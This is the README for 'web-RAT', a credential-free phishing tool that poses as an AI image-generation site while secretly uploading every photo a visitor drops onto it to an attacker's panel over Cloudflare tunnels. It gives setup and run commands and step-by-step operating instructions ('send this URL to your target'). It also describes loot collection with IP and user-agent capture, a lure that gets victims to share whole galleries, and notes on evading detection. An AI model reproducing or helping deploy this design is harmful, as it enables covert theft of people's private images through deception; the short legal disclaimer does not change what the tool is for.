# web-RAT

> A web-only image exfiltration RAT with a dual-tunnel architecture — one victim-facing image studio, one attacker panel. Built by [KAKUDEV-Anon](https://github.com/KAKUDEV-Anon).

![Python](https://img.shields.io/badge/python-3.9%2B-blue)
![Flask](https://img.shields.io/badge/flask-2.x-black)
![Platform](https://img.shields.io/badge/platform-linux%20%7C%20macos%20%7C%20windows-lightgrey)
![License](https://img.shields.io/badge/license-MIT-green)
![Status](https://img.shields.io/badge/status-active-brightgreen)

---

## Overview

**web-RAT** is a browser-driven image exfiltration tool. It serves two independent Flask applications simultaneously:

| Server | Port | Purpose |
|---|---|---|
| **Victim** | `8000` | A polished "AI image studio" front-end that silently exfiltrates every uploaded image |
| **Attacker** | `8001` | A dark-mode control panel to view, browse, and bulk-download all loot |

Both servers are exposed to the internet via **Cloudflare Quick Tunnels** (`cloudflared`), giving you two live URLs without port forwarding, DNS, or a VPS.

The victim page is fully functional from their perspective: drag-and-drop upload, prompt chips, generation queue animation, engine selector, live activity feed. Behind the scenes, every file is base64-encoded and POSTed to the attacker's backend the moment it's dropped — *before* the "Generate" button is ever pressed.

---

## Features

- 🎭 **Full social-engineering front-end** — NonoBanana image studio with working drag/drop, thumbnails, prompt chips, generation queue, and error states
- 🔪 **Instant exfiltration** — files are captured on drop, not on submit
- 🍯 **Secondary prompt** — after first upload, a "style matching" card appears that lets the victim voluntarily send their entire gallery
- 🖥️ **Attacker panel** — victim list, IP tracking, user-agent capture, per-victim image grid, individual download, and bulk ZIP export
- 🌐 **Dual Cloudflare tunnels** — zero-config public URLs auto-spawned on launch
- 📦 **Disk + memory loot** — every image saved to `./loot/<victim_id>/` and held in memory for the panel
- 🧵 **Thread-safe** — shared victim registry protected by a single lock
- 🧼 **IP resolution** — honors `CF-Connecting-IP` and `X-Forwarded-For` for accurate capture behind proxies
- 🚀 **Single-file deployment** — one `pip install`, one `python main.py`

---

## Requirements

- **Python** 3.9 or newer
- **Flask** (`pip install flask`)
- **cloudflared** — must be installed and on `PATH`
  - Linux: [download](https://github.com/cloudflare/cloudflared/releases) the binary and `chmod +x`
  - macOS: `brew install cloudflared`
  - Windows: [download](https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe)

---

## Installation

```bash
# clone
git clone https://github.com/KAKUDEV-Anon/web-RAT.git
cd web-RAT

# install deps
pip install flask

# verify cloudflared is available
cloudflared --version
```

---

Usage

```bash
python main.py
```

On launch you'll see:

```
[*] victim   flask → 127.0.0.1:8000
[*] attacker flask → 127.0.0.1:8001
[*] opening cloudflared tunnels...

[+] VICTIM   (send this) URL: https://xxxxxxxx.trycloudflare.com
[+] ATTACKER (yours)    URL: https://yyyyyyyy.trycloudflare.com
```

What you do

1. Send the VICTIM URL to your target.
2. Open the ATTACKER URL in your own browser — this is your panel.
3. Wait. Every image they upload appears in your panel in real time.
4. Click a victim ID to view their full image grid, or hit zip all to bulk-download their loot.

What they see

A fully polished AI image generation studio. They drag in photos, type a prompt, click Generate — and get a fake queue animation followed by a "generation failed" error. But every file they dropped is already sitting in your ./loot/ directory.

---

Project Structure

```
web-RAT/
├── main.py              # entire tool — both Flask apps + tunnel spawner
├── loot/                # auto-created; per-victim image folders
│   └── <victim_id>/
│       ├── 0000_photo.jpg
│       └── 0001_screenshot.png
└── README.md
```

---

Attacker Panel Reference

Route Description
/ Victim table — ID, IP, first seen, image count, bulk ZIP link
/v/<vid> Per-victim view — full image grid with thumbnails
/v/<vid>/img/<idx> Stream a single image inline
/v/<vid>/dl/<idx> Download a single image with original filename
/v/<vid>/zip Bulk-download all victim images as ZIP

---

Victim Endpoint Reference

Route Description
/ Serve the fake image studio
/api/u Silent image upload sink (base64 JSON, 25 MB cap)

---

Configuration

All constants are at the top of main.py:

```python
VICTIM_PORT   = 8000
ATTACKER_PORT = 8001
LOOT_DIR      = Path("./loot")
```

Change VICTIM_PORT / ATTACKER_PORT if they collide with something local. Change LOOT_DIR to relocate the archive.

---

How it Works

```
┌────────────────┐  files   ┌────────────────┐
│  Victim           │ ───────►│  /api/u sink     │──┐
│  browser          │          │  (base64 POST).   │  │
└────────────────┘          └────────────────┘  │
                                                       │
┌────────────────┐                                 ▼
│  Attacker         │ ◄──── reads ────── ┌──────────────────┐
│  browser          │                      │ victims{} dict      │
└────────────────┘                      │  + ./loot/<vid>/    │
                                           └──────────────────┘
```

1. Victim loads / — their IP and UA are registered as a new victim ID.
2. Victim drops a file — JS reads it as base64, fires a silent POST /api/u.
3. Backend base64-decodes, writes to ./loot/<vid>/<name>, appends to victims[vid]["images"].
4. Attacker panel is a thin read view over victims{} — refresh to see new loot.
5. Cloudflare tunnels expose both servers on separate trycloudflare.com subdomains.

---

Example Session

```bash
$ python main.py

 ██╗  ██╗ █████╗ ██╗  ██╗ ██╗   ██╗   
 ██║ ██╔╝██╔══██╗██║ ██╔╝██║   ██║   
 █████╔╝ ███████║█████╔╝ ██║   ██║    
 ██╔═██╗ ██╔══██║██╔═██╗ ██║   ██║    
 ██║  ██╗██║  ██║██║  ██╗╚██████╔╝   
 ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝     

[*] victim   flask → 127.0.0.1:8000
[*] attacker flask → 127.0.0.1:8001
[*] opening cloudflared tunnels...

[+] VICTIM   (send this) URL: https://morning-fox-rapid.trycloudflare.com
[+] ATTACKER (yours)    URL: https://silent-hawk-sharp.trycloudflare.com

[+] a1b2c3d4e5f6 +photo.jpg (312KB)
[+] a1b2c3d4e5f6 +screenshot.png (1287KB)
[+] a1b2c3d4e5f6 +vacation.jpeg (4821KB)
```

---

Detection & Evasion Notes

The victim page is intentionally indistinguishable from a real SaaS landing page:

· Uses system-ui font stack
· Real CSS design system with tokens (--bg, --acc, etc.)
· Live "recent generations" ticker with fake handles
· Working file validation and thumbnail rendering
· Generation queue with realistic progress math and randomized ETA
· Graceful error state (Couldn't reach the render server) instead of a fake success
· No external network calls to suspicious domains — everything runs through the tunnel itself

The exfil endpoint (/api/u) is called with keepalive semantics via .catch(()=>{}) — silent failures are swallowed so no console noise reaches the victim.

---

Disclaimer

This tool is provided for authorized security testing, red-team engagements, and educational research only. You must have explicit written permission from the owner of any system or device you target.

Unauthorized use of this tool against systems or individuals you do not own or have written consent to test is illegal in virtually every jurisdiction and may violate:

· Computer Fraud and Abuse Act (US)
· Computer Misuse Act (UK)
· Directive 2013/40/EU (EU)
· Equivalent national cybercrime statutes worldwide

The author (KAKUDEV-Anon) assumes no liability for misuse, damage, or legal consequences resulting from this software. You are solely responsible for your actions.

If you're not authorized — don't run it. If you're not sure — don't run it.

---

Credits

Author: KAKUDEV-Anon
Telegram: t.me/kakuexploits

Built on Flask. Tunneled with Cloudflare. Tested on nothing but intent.

---

License

MIT — see LICENSE for the boring details.
